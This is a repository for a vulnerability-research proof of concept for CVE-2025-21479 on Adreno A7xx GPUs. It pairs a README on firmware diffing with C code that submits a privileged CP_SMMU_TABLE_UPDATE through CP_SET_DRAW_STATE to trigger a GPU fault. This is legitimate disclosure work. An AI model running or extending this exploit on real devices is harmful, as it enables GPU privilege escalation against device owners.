@@ -1,0 +1,617 @@
+Project Path: arc_gmh5225_cheese_svybn8i5
+
+Source Tree:
+
+```txt
+arc_gmh5225_cheese_svybn8i5
+├── README.md
+├── adrenaline.h
+├── build.sh
+└── cheese.c
+
+```
+
+`README.md`:
+
+```md
+Proof-of-concept for [CVE-2025-21479](https://docs.qualcomm.com/product/publicresources/securitybulletin/june-2025-bulletin.html), demonstrating that it only affects Adreno A7xx (Snapdragon 8 Gen 1 / XR2 Gen 2 and newer) devices.
+
+This only tests whether the device is vulnerable - getting this to actually do anything interesting would require more effort.
+
+On unpatched Adreno A7xx devices, running this should print:
+
+```
+0 0
+```
+
+And if you run `adb bugreport`, in the kernel `dmesg`, you will see:
+
+```
+<2>[146532.566695][  T933] kgsl kgsl-3d0: GPU PAGE FAULT: addr = 4000031004 pid= 0 name=(null) drawctxt=1111638594 context pid = 0
+<2>[146532.566756][  T933] kgsl kgsl-3d0: context=gfx3d_user TTBR0=0x1234567841414141 (write unknown fault)
+<2>[146532.566783][  T933] kgsl kgsl-3d0: FAULTING BLOCK: CP
+```
+
+On Adreno A6xx devices, running this prints:
+
+```
+41414141 42424242
+```
+
+https://notnow.dev/notice/AvIZRBttG7DsDhx9hw
+
+Patched Adreno A7xx (e.g. Samsung devices after the [2025 May security update](https://security.samsungmobile.com/serviceWeb.smsb)) should also print this, but I have not tested it.
+
+# How to use
+
+```
+# adjust path to point to your Android NDK
+bash build.sh
+adb push cheese /data/local/tmp
+adb shell /data/local/tmp/cheese
+```
+
+# Thanks
+
+This is based on other researchers' Adreno GPU writeups: this uses code from:
+- [Project Zero/Ben Hawkes's Adrenaline](https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html)
+- [GitHub Security/Man Yue Mo's adreno_user](https://github.blog/security/vulnerability-research/the-code-that-wasnt-there-reading-memory-on-an-android-device-by-accident/)
+- [Freedreno/Rob Clark's kilroy](https://github.com/robclark/kilroy/blob/master/kilroy.c)
+
+Additional info on Adreno GPUs' firmware, including how to diff the firmware and how the firmware works, comes from from Freedreno's [afuc documentation](https://gitlab.freedesktop.org/mesa/mesa/-/blob/c0f56fc64cad946d5c4fda509ef3056994c183d9/src/freedreno/afuc/README.rst) by Rob Clark, Connor Abbott, and other Freedreno/Turnip contributors.
+
+Thanks to the [XRBreak community](https://estradiol.city/@ity/114482800282797778) for their support.
+
+# How it works
+
+https://notnow.dev/notice/Av4sfoQjyrxogkZ6Ya
+
+This runs a command buffer on the Adreno GPU (Using a modified version of [Project Zero's Adrenaline code](https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html))
+
+Run `CP_SET_MODE` - this enables draw states to run immediately.
+
+Run `CP_SET_DRAW_STATE` - this sets `IB_LEVEL` to 0x4, then calls a instruction buffer.
+
+Inside the `CP_SET_DRAW_STATE`, run `CP_SMMU_TABLE_UPDATE`.
+
+Here’s the firmware handling `CP_SMMU_TABLE_UPDATE`:
+
+```
+CP_SMMU_TABLE_UPDATE:
+// get IB level
+and $02, $12, 0x3
+// if not 0 (kernel ring buffer), go to CP_NOP
+brne $02, 0x0, #l1873
+<actual SMMU modify code >
+(IB level = 4) & 0x3 == 0
+```
+
+So with IB_LEVEL=4, masking 4 with 3 gives you 0, which passes the check for kernel ring buffer.
+
+So you can change the pagetables and causes the GPU to error out.
+
+# How I diffed the patch
+
+I diffed several Samsung Galaxy firmwares using Freedreno's [afuc](https://gitlab.freedesktop.org/mesa/mesa/-/blob/c0f56fc64cad946d5c4fda509ef3056994c183d9/src/freedreno/afuc/README.rst) disassembler.
+
+The Galaxy S24 firmware was the most helpful, since its GPU firmware only differs by one version - the security fix:
+
+https://notnow.dev/notice/AuueszvUVUQnWqMQeO
+
+https://notnow.dev/notice/Av0kDfOUPKhqHyjyxE
+
+Galaxy S24 firmware: `gen70900_sqe.fw`
+- April update (S921USQU4BYD9): v675
+- May update (S921USQS4BYE4): v676
+
+https://notnow.dev/notice/Av0a7wUouVSa3EKkE4
+
+Diffing Galaxy S24 Adreno firmware between v675 and v676 shows one type of diff:
+
+```diff
+        0163: b80300a4  CP_ME_INIT:
+        0163: b80300a4  fxn355:
+        0163: b80300a4  cread $03, [$00 + 0x0a4]
+-       0164: 2a440003  and $04, $12, 0x3
++       0164: 2a440007  and $04, $12, 0x7
+        0165: 98641813  ushr $03, $03, $04
+        0166: c860004a  brne $03, b0, #l432
+        0167: 01000000  nop
+```
+Every access to `$12` now ANDs with `0x7` instead of `0x3`. There are no other changes.
+
+https://gist.github.com/zhuowei/46a68b9ee53589cdeaa40c11d15d895f
+
+Register $12 seems to be the IB level:
+https://gitlab.freedesktop.org/mesa/mesa/-/blob/c0f56fc64cad946d5c4fda509ef3056994c183d9/src/freedreno/afuc/README.rst#id23
+https://gitlab.freedesktop.org/mesa/mesa/-/blob/c0f56fc64cad946d5c4fda509ef3056994c183d9/src/freedreno/afuc/README.rst#id29
+
+Which selects which queue of draw commands will be read.
+https://gitlab.freedesktop.org/mesa/mesa/-/blob/c0f56fc64cad946d5c4fda509ef3056994c183d9/src/freedreno/afuc/README.rst#id31
+
+The Adreno 7xx hardware supports 5 queues (RB (kernel ringbuffer, priviledged), IB1, IB2, IB3, or SDS):
+https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_control_regs.xml;l=327;drc=c0867f48117dc2c18b1ae689235cb1f60b237600
+
+https://notnow.dev/notice/Av0kDfOUPKhqHyjyxE
+
+I think this diff is CVE-2025-21479.
+It looks like it only affects Adreno A7xx devices (Snapdragon 8 Gen 1 and above).
+Maybe the [Qualcomm bulletin](https://docs.qualcomm.com/product/publicresources/securitybulletin/june-2025-bulletin.html#_cve-2025-21479) is wrong?
+
+- A6xx has 4 IB levels: RB, IB1, IB2, and SDS: SDS=0x3
+- A7xx adds IB3: now there are 5 IB levels: RB, IB1, IB2, IB3, and SDS=0x4.
+- SDS is now 0x4, so masking with 0x3 would give 0x0.
+
+
+I'm guessing, on an Adreno A7xx device:
+- if you could somehow execute commands at IB level 4 (SDS) with `CP_SET_DRAW_STATE`
+- and find a command that checks for IB level = RB (kernel-provided ring buffer), such as `CP_SMMU_TABLE_UPDATE`
+- you can trick it into bypassing the check
+
+---
+
+According to the [Project Zero blog post](https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html), the `CP_INDIRECT_BUFFER` instruction calls an indirect buffer of control processor instructions, 
+
+When an app wants to use the GPU, the kernel's RB (kernel ring buffer) will contain a `CP_INDIRECT_BUFFER` command that calls a user provided Indirect Buffer- IB1. 
+This user buffer can call its own indirect buffers: IB2.
+On A7xx, there's also IB3.
+
+Additionally, on both A6xx and A7xx, there's SDS, which isn't entered by indirect buffer, but by `CP_SET_DRAW_STATE`.
+
+https://cs.android.com/android/platform/superproject/+/android15-qpr2-release:external/mesa3d/src/freedreno/decode/cffdec.c;l=3030;drc=0dc791ed57dacf9fe3df694d7f285a8d9f942fa7
+https://cs.android.com/android/platform/superproject/+/android15-qpr2-release:external/mesa3d/src/freedreno/decode/cffdec.c;l=2283;drc=0dc791ed57dacf9fe3df694d7f285a8d9f942fa7
+
+A6xx has RB, IB1, IB2, and SDS.
+`CP_SET_DRAW_STATE` sets IB level to 0x3: in `a650_sqe.fw.v114` from the Galaxy Fold 3 firmware:
+```
+mov $03, 0x3
+or $12, $12, 0x20
+call #fxn1132 // there's a branch delay slot, so this isn't executed yet...
+cwrite $03, [$00 + @IB_LEVEL]
+```
+
+But A7xx now has RB, IB1, IB2, IB3, or SDS.
+`CP_SET_DRAW_STATE` now sets IB level to 0x4:
+```
+mov $03, 0x4
+cwrite $03, [$00 + @IB_LEVEL]
+```
+
+0x4 & 0x3 = 0x0. 
+
+https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_control_regs.xml;l=327;drc=c0867f48117dc2c18b1ae689235cb1f60b237600
+
+So code checking the current IB level will think SDS (set draw state) is RB (kernel ring buffer), and commands such as `CP_SMMU_TABLE_UPDATE` will allow execution.
+
+```
+
+`adrenaline.h`:
+
+```h
+//
+// Created by hawkes on 4/28/20.
+//
+
+#ifndef ADRENALINE_ADRENALINE_H
+#define ADRENALINE_ADRENALINE_H
+
+enum kgsl_user_mem_type {
+    KGSL_USER_MEM_TYPE_PMEM         = 0x00000000,
+    KGSL_USER_MEM_TYPE_ASHMEM       = 0x00000001,
+    KGSL_USER_MEM_TYPE_ADDR         = 0x00000002,
+    KGSL_USER_MEM_TYPE_ION          = 0x00000003,
+    KGSL_USER_MEM_TYPE_DMABUF       = 0x00000003,
+    KGSL_USER_MEM_TYPE_MAX          = 0x00000007,
+};
+
+struct kgsl_map_user_mem {
+    int fd;
+    unsigned long gpuaddr;   /*output param */
+    size_t len;
+    size_t offset;
+    unsigned long hostptr;   /*input param */
+    enum kgsl_user_mem_type memtype;
+    unsigned int flags;
+};
+
+struct kgsl_drawctxt_create {
+    unsigned int flags;
+    unsigned int drawctxt_id; /*output param */
+};
+
+/* destroy a draw context */
+struct kgsl_drawctxt_destroy {
+    unsigned int drawctxt_id;
+};
+
+
+struct kgsl_command_object {
+    uint64_t offset;
+    uint64_t gpuaddr;
+    uint64_t size;
+    unsigned int flags;
+    unsigned int id;
+};
+
+struct kgsl_gpu_command {
+    uint64_t flags;
+    uint64_t __user cmdlist;
+    unsigned int cmdsize;
+    unsigned int numcmds;
+    uint64_t __user objlist;
+    unsigned int objsize;
+    unsigned int numobjs;
+    uint64_t __user synclist;
+    unsigned int syncsize;
+    unsigned int numsyncs;
+    unsigned int context_id;
+    unsigned int timestamp;
+};
+
+#define KGSL_IOC_TYPE 0x09
+
+#define IOCTL_KGSL_DRAWCTXT_CREATE \
+        _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+
+#define IOCTL_KGSL_DRAWCTXT_DESTROY \
+        _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
+
+#define IOCTL_KGSL_MAP_USER_MEM \
+        _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
+
+#define IOCTL_KGSL_GPU_COMMAND \
+        _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
+
+#define KGSL_CMDLIST_IB             0x00000001U
+#define KGSL_MEMFLAGS_USE_CPU_MAP   0x10000000ULL
+
+#define CP_TYPE4_PKT    (4 << 28)
+#define CP_TYPE7_PKT    (7 << 28)
+
+#define CP_NOP                  0x10
+#define CP_WAIT_FOR_ME          0x13
+#define CP_WAIT_FOR_IDLE        0x26
+#define CP_WAIT_REG_MEM         0x3c
+#define CP_MEM_WRITE            0x3d
+#define CP_INDIRECT_BUFFER_PFE  0x3f
+#define CP_SET_DRAW_STATE       0x43
+#define CP_MEM_TO_MEM           0x73
+
+#define upper_32_bits(n) ((uint32_t)(((n) >> 16) >> 16))
+#define lower_32_bits(n) ((uint32_t)(n))
+
+static inline uint cp_gpuaddr(uint *cmds, uint64_t gpuaddr)
+{
+    uint *start = cmds;
+
+    *cmds++ = lower_32_bits(gpuaddr);
+    *cmds++ = upper_32_bits(gpuaddr);
+
+    return cmds - start;
+}
+
+static inline uint pm4_calc_odd_parity_bit(uint val) {
+    return (0x9669 >> (0xf & ((val) ^
+                              ((val) >> 4) ^ ((val) >> 8) ^ ((val) >> 12) ^
+                              ((val) >> 16) ^ ((val) >> 20) ^ ((val) >> 24) ^
+                              ((val) >> 28)))) & 1;
+}
+
+static inline uint cp_type7_packet(uint opcode, uint cnt) {
+    return CP_TYPE7_PKT | ((cnt) << 0) |
+           (pm4_calc_odd_parity_bit(cnt) << 15) |
+           (((opcode) & 0x7F) << 16) |
+           ((pm4_calc_odd_parity_bit(opcode) << 23));
+}
+
+static inline uint cp_wait_for_me(
+        uint *cmds)
+{
+    uint *start = cmds;
+
+    *cmds++ = cp_type7_packet(CP_WAIT_FOR_ME, 0);
+
+    return cmds - start;
+}
+
+static inline uint cp_mem_packet(int opcode, uint size, uint num_mem) {
+    return cp_type7_packet(opcode, size + num_mem);
+}
+
+static inline uint cp_wait_for_idle(
+        uint *cmds)
+{
+    uint *start = cmds;
+
+    *cmds++ = cp_type7_packet(CP_WAIT_FOR_IDLE, 0);
+
+    return cmds - start;
+}
+
+static inline int _adreno_iommu_add_idle_indirect_cmds(
+        unsigned int *cmds)
+{
+    unsigned int *start = cmds;
+    cmds += cp_wait_for_me(cmds);
+    *cmds++ = cp_mem_packet(CP_INDIRECT_BUFFER_PFE, 2, 1);
+    cmds += cp_gpuaddr(cmds, 0xfc000000+1024);
+    *cmds++ = 2;
+    cmds += cp_wait_for_idle(cmds);
+    return cmds - start;
+}
+
+static inline uint cp_type4_packet(uint opcode, uint cnt)
+{
+    return CP_TYPE4_PKT | ((cnt) << 0) |
+           (pm4_calc_odd_parity_bit(cnt) << 7) |
+           (((opcode) & 0x3FFFF) << 8) |
+           ((pm4_calc_odd_parity_bit(opcode) << 27));
+}
+
+static inline uint cp_register(
+        unsigned int reg, unsigned int size)
+{
+    return cp_type4_packet(reg, size);
+}
+
+static inline uint cp_invalidate_state(
+        uint *cmds)
+{
+    uint *start = cmds;
+
+    *cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
+    *cmds++ = 0x40000;
+    *cmds++ = 0;
+    *cmds++ = 0;
+
+    return cmds - start;
+}
+
+#endif //ADRENALINE_ADRENALINE_H
+
+```
+
+`build.sh`:
+
+```sh
+exec ~/Library/Android/sdk/ndk/26.1.10909125/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android34-clang -o cheese cheese.c
+```
+
+`cheese.c`:
+
+```c
+#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
+
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include "adrenaline.h"
+#include <string.h>
+
+#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL
+
+// from adrenaline.cpp:
+// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html
+
+/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
+ * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
+int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
+    struct kgsl_drawctxt_create req = {
+            .flags = 0x00001812, // low prio, rb 0
+    };
+    int ret;
+
+    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
+    if (ret)
+        return ret;
+
+    *ctx_id = req.drawctxt_id;
+
+    return 0;
+}
+
+/* cleanup an existing GPU context */
+int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
+    struct kgsl_drawctxt_destroy req = {
+            .drawctxt_id = ctx_id,
+    };
+
+    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
+}
+
+#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U
+
+/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
+ * comes from earlier debugging efforts, but a normal user mapping should work as well,
+ * it would just need to use uint64_t and drop the flags. */
+// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
+int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
+    struct kgsl_map_user_mem req = {
+            .len = len,
+            .offset = 0,
+            .hostptr = addr,
+            .memtype = KGSL_USER_MEM_TYPE_ADDR,
+            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
+    };
+    int ret;
+
+    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
+    if (ret)
+        return ret;
+
+    *gpuaddr = req.gpuaddr;
+
+    return 0;
+}
+
+/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
+ * the race condition with the targeted context switch */
+int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
+    struct kgsl_command_object *cmds;
+
+    struct kgsl_gpu_command req = {
+            .context_id = ctx_id,
+            .cmdsize = sizeof(struct kgsl_command_object),
+            .numcmds = n,
+    };
+    size_t cmds_size;
+    uint32_t i;
+
+    cmds_size = n * sizeof(struct kgsl_command_object);
+
+    cmds = (struct kgsl_command_object *) malloc(cmds_size);
+
+    if (cmds == NULL) {
+        return -1;
+    }
+
+    memset(cmds, 0, cmds_size);
+
+    for (i = 0; i < n; i++) {
+        cmds[i].flags = KGSL_CMDLIST_IB;
+
+        if (i == target_idx) {
+            cmds[i].gpuaddr = target_cmd;
+            cmds[i].size = target_size;
+        }
+        else {
+            /* the shift here is helpful for debugging failed alignment */
+            cmds[i].gpuaddr = gpuaddr + (i << 16);
+            cmds[i].size = cmdsize;
+        }
+    }
+
+    req.cmdlist = (unsigned long) cmds;
+
+    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
+
+    free(cmds);
+    return err;
+}
+
+#define CP_WAIT_MEM_WRITES 0x12
+#define CP_SET_DRAW_STATE 0x43
+#define CP_SET_MODE 0x63
+#define CP_INDIRECT_BUFFER 0x3f
+#define DRAW_STATE_MODE_BINNING 0x1
+#define DRAW_STATE_MODE_GMEM 0x2
+#define DRAW_STATE_MODE_BYPASS 0x4
+#define DRAW_STATE_DIRTY (1 << 16)
+#define CP_SMMU_TABLE_UPDATE 0x53
+
+int main() {
+    int fd = open("/dev/kgsl-3d0", O_RDWR);
+    if (fd == -1) {
+        fprintf(stderr, "Can't open kgsl\n");
+        return 1;
+    }
+
+    uint32_t ctx_id;
+
+    int err = kgsl_ctx_create0(fd, &ctx_id);
+    if (err) {
+        fprintf(stderr, "Can't create context: %s\n", strerror(err));
+        return 1;
+    }
+
+    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
+                                        PROT_READ|PROT_WRITE,
+                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (payload_buf == MAP_FAILED) {
+        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
+        return 1;
+    }
+
+    uint64_t payload_gpuaddr;
+
+    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
+    if (err) {
+        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
+        return 1;
+    }
+
+    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
+        PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+    uint64_t output_gpuaddr;
+    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
+    if (err) {
+        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
+        return 1;
+    }
+
+    // Sign of life: just ask the GPU to write something...
+
+    uint32_t* drawstate_buf = payload_buf + 0x100;
+    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
+    uint32_t* drawstate_cmds = drawstate_buf;
+    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
+    drawstate_cmds += cp_gpuaddr(drawstate_cmds, 0x1234567841414141);
+    *drawstate_cmds++ = 0x42424242;
+    *drawstate_cmds++ = 0x43434343;
+    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
+    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
+    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
+    drawstate_cmds += cp_gpuaddr(drawstate_cmds, output_gpuaddr + 4);
+    *drawstate_cmds++ = 0x42424242;
+
+    uint32_t* payload_cmds = payload_buf;
+#if 1
+    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
+    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
+    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
+    *payload_cmds++ = 1;
+#endif
+#if 1
+    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
+    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
+    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
+    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
+#endif
+#if 0
+    *payload_cmds++ = cp_type7_packet(CP_INDIRECT_BUFFER, 3);
+    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);
+    *payload_cmds++ = (drawstate_cmds - drawstate_buf);
+#endif
+    *payload_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
+    payload_cmds += cp_gpuaddr(payload_cmds, output_gpuaddr);
+    *payload_cmds++ = 0x41414141;
+
+    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);
+
+    sleep(1);
+    printf("running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
+    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
+        printf("%x ", payload_buf[i]);
+    }
+    printf("\n");
+    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
+    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
+    err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
+    if (err) {
+        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
+        return 1;
+    }
+
+    sleep(1);
+    while (1) {
+        fprintf(stderr, "%x %x\n", output_buf[0], output_buf[1]);
+        sleep(1);
+    }
+
+    err = kgsl_ctx_destroy(fd, ctx_id);
+    if (err) {
+        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
+        return 1;
+    }
+
+    close(fd);
+    return 0;
+}
+```
